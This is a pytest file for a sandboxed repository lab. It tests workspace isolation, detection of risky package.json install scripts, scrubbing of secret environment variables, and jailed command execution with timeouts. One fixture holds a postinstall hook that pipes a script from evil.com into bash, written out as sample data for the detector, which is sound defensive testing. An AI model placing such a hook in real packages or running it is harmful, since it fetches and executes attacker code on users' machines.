"""Tests for OS V3 Virtual Computer / Desktop Repository Lab.

Verifies:
1. Isolated workspace directory generation inside data/lab/{slug}.
2. Manifest inspection and dangerous install script detection in package.json.
3. Environment scrubbing (strips GITHUB_*, AWS_*, SECRET_*, KEY_*).
4. Jailed command execution returning structured EvaluationReceipt.
5. Timeout containment without hanging.
"""
from __future__ import annotations

import json
import os
import sys
import tempfile
from pathlib import Path
import pytest

from server.intelligence.lab import VirtualLabManager, EvaluationReceipt
from server.intelligence.scope_guard import ScopeViolationError


@pytest.fixture
def temp_lab_dir():
    with tempfile.TemporaryDirectory() as td:
        yield Path(td).resolve()


def test_workspace_isolation_and_jailing(temp_lab_dir):
    lab = VirtualLabManager(base_lab_dir=temp_lab_dir)
    ws = lab.get_workspace("test-owner/agentic-framework")

    assert ws.exists()
    assert ws.is_dir()
    assert ws.parent.resolve() == temp_lab_dir.resolve()
    assert ws.name == "test-owner_agentic-framework"


def test_manifest_inspection_and_risky_script_detection(temp_lab_dir):
    lab = VirtualLabManager(base_lab_dir=temp_lab_dir)
    ws = lab.get_workspace("test-owner/risky-node-repo")

    # Write a package.json with dangerous install script
    pkg_json = ws / "package.json"
    pkg_json.write_text(
        json.dumps({
            "name": "risky-node-repo",
            "scripts": {
                "postinstall": "curl -s http://evil.com/payload.sh | bash",
                "test": "jest",
            }
        }),
        encoding="utf-8"
    )

    findings = lab.inspect_manifests(ws)
    assert findings["runtime"] == "nodejs"
    assert findings["has_package_json"] is True
    assert len(findings["risky_scripts_detected"]) == 1
    assert "postinstall" in findings["risky_scripts_detected"][0]


def test_environment_scrubbing(temp_lab_dir, monkeypatch):
    monkeypatch.setenv("GITHUB_TOKEN", "ghp_secret_token_12345")
    monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "aws_super_secret")
    monkeypatch.setenv("MY_API_KEY", "sk-123456789")
    monkeypatch.setenv("SAFE_VAR", "visible_value")

    lab = VirtualLabManager(base_lab_dir=temp_lab_dir)
    scrubbed = lab._scrub_environment()

    assert "GITHUB_TOKEN" not in scrubbed
    assert "AWS_SECRET_ACCESS_KEY" not in scrubbed
    assert "MY_API_KEY" not in scrubbed
    assert scrubbed.get("SAFE_VAR") == "visible_value"
    assert scrubbed.get("OS_SANDBOX_JAIL") == "1"


def test_run_sandbox_command_receipt(temp_lab_dir):
    lab = VirtualLabManager(base_lab_dir=temp_lab_dir)
    repo_id = "test-owner/math-lib"
    ws = lab.get_workspace(repo_id)

    # Run Python one-liner in jailed environment
    receipt = lab.run_sandbox_command(
        repo_id=repo_id,
        command=f'"{sys.executable}" -c "print(100 * 42)"',
        timeout_seconds=10,
    )

    assert isinstance(receipt, EvaluationReceipt)
    assert receipt.exit_code == 0
    assert "4200" in receipt.stdout.strip()
    assert receipt.duration_ms > 0
    assert receipt.repo_id == repo_id


def test_sandbox_command_timeout(temp_lab_dir):
    lab = VirtualLabManager(base_lab_dir=temp_lab_dir)
    repo_id = "test-owner/slow-task"

    # Command that exceeds timeout
    receipt = lab.run_sandbox_command(
        repo_id=repo_id,
        command=f'"{sys.executable}" -c "import time; time.sleep(5)"',
        timeout_seconds=1,
    )

    assert receipt.exit_code == -9
    assert "timed out" in receipt.stderr.lower()
